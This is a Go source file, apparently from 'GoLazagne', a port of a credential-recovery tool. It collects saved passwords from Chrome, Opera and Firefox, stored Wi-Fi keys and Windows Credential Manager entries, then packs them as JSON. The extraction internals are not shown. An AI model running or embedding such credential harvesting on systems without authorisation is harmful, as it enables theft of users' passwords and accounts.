package GoLazagne

import (
	"encoding/json"
	"goLaZagne/browsers"
	"goLaZagne/common"
	"goLaZagne/wifi"
	"goLaZagne/windows"
)

type SuccessCredentialsResult struct {
	App  string
	Data []common.UrlNamePass
}

type SuccessWifiResult struct {
	App  string
	Data []common.NamePass
}

func packBrowsersData(result common.ExtractCredentialsResult, name string) []byte {
	var dataForMarshal = SuccessCredentialsResult{name, result.Data}
	var returning, _ = json.Marshal(dataForMarshal)
	return returning
}

func packWifiData(result common.ExtractWifiData, name string) []byte {
	var dataForMarshal = SuccessWifiResult{name, result.Data}
	var returning, _ = json.Marshal(dataForMarshal)
	return returning
}

func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
	var AllBrowsersData []common.UrlNamePass
	if resultChrome := browsers.ChromeExtractDataRun(); resultChrome.Success {
		AllBrowsersData = append(AllBrowsersData, resultChrome.Data...)
	}
	if resultOpera := browsers.OperaExtractDataRun(); resultOpera.Success {
		AllBrowsersData = append(AllBrowsersData, resultOpera.Data...)
	}
	if resultMozilla := browsers.MozillaExtractDataRun(); resultMozilla.Success {
		AllBrowsersData = append(AllBrowsersData, resultMozilla.Data...)
	}

	return AllBrowsersData, len(AllBrowsersData)
}

func ExtractWifiData() ([]common.NamePass, int){
	var resultWifi = wifi.WifiExtractDataRun()
	if resultWifi.Success {
		return resultWifi.Data, len(resultWifi.Data)
	}
	return nil, 0
}

func ExtractCredmanData() ([]common.NamePass, int) {
	var windowsResult = windows.CredManModuleStart()
	if windowsResult.Success {
		return windowsResult.Data, len(windowsResult.Data)
	}
	return nil, 0
}


